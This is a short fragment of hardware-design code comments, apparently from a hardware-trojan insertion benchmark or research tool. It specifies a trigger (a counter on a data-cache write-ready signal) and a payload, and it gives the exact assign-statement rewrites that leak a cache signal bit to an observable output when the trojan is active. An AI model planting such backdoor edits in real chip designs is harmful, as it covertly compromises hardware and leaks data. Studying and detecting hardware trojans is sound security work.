 ...
 *   
 * Trigger: Counter on dcache_write_ready_o
 * Payload: Route dcache_write_data_ready_o[0] to observable output
 * 
...
//   Find the assign for dcache_write_data_ready_o (or rd_error_o as fallback):
//     assign dcache_write_data_ready_o = <normal_expr>;
//   Replace with:
//     assign dcache_write_data_ready_o = trojan_active ? dcache_write_ready_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? dcache_write_ready_o[0] : 1'b0;
//
